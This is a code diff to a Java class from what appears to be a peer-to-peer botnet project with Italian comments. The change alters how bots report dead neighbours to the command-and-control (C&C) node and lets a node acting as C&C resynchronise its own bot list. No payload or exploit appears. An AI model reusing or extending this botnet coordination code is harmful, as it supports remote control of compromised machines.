@@ -429,7 +429,7 @@ public class Behavior {
 		pServ.setNewKing(nServ.getIdHash());
 		System.out.println("Creo grafo rete P2P");
 		pServ.createNetworkP2P();
-		String myId =pki.getCrypto().encryptAES(nServ.getIdHash());
+		String myId = pki.getCrypto().encryptAES(nServ.getIdHash());
 		System.out.println("Importo Database dal C&C");
 		// richiesta ruoli
 		List<Role> roles = req.getRoles(ip, myId);
@@ -548,24 +548,33 @@ public class Behavior {
 		// invico a cec di mia nuova lista vicini ovvero di chi mi ha risposto
 		List<Pairs<IP, PublicKey>> newNeighbours = new ArrayList<Pairs<IP, PublicKey>>();
 		List<Pairs<String, String>> response = null;
-		response = req.sendDeadNeighToCeC(nServ.getCommandConquerIps().get(0).getValue1().toString(), nServ.getIdHash(),
-				listDeadNegh);
-		if(response!=null){
-			newNeighbours = nServ.tramsuteNeigha(response);
-			if (newNeighbours != null) {
-				newNeighbours.forEach(ob -> System.out.println("Vicinato convertito " + ob.getValue1().toString()));
-			} else
-				System.out.println("Risposta vicini senza elementi");
+		if (!eng.isCommandandconquerStatus()) {
+			response = req.sendDeadNeighToCeC(nServ.getCommandConquerIps().get(0).getValue1().toString(),
+					nServ.getIdHash(), listDeadNegh);
+			if (response != null) {
+				newNeighbours = nServ.tramsuteNeigha(response);
+				if (newNeighbours != null) {
+					newNeighbours.forEach(ob -> System.out.println("Vicinato convertito " + ob.getValue1().toString()));
+				} else
+					System.out.println("Risposta vicini senza elementi");
 
-			SyncIpList<IP, PublicKey> buf = nServ.getNeighbours();
-			buf.setAll(newNeighbours);
-			nServ.setNeighbours(buf);// TODO controllare se serve veramente
-			System.out.println("Avviso i mie vicini di conoscerli");
-			challengeToBot();
-		}else{
-			System.out.println("Errore invio morti al CeC");
+				SyncIpList<IP, PublicKey> buf = nServ.getNeighbours();
+				buf.setAll(newNeighbours);
+				nServ.setNeighbours(buf);// TODO controllare se serve veramente
+				System.out.println("Avviso i mie vicini di conoscerli");
+				challengeToBot();
+			} else {
+				System.out.println("Errore invio morti al CeC");
+			}
+		} else {
+			System.out.println("Sono CeC e mi auto sincronizzo");
+			for (IP botDead : listDeadNegh) {
+				nServ.getAliveBot().removeByValue1(botDead);
+				nServ.getNeighbours().removeByValue1(botDead);
+				pServ.updateNetworkP2P();
+			}
+
 		}
-	
 	}
 
 	public P2PMan getpServ() {
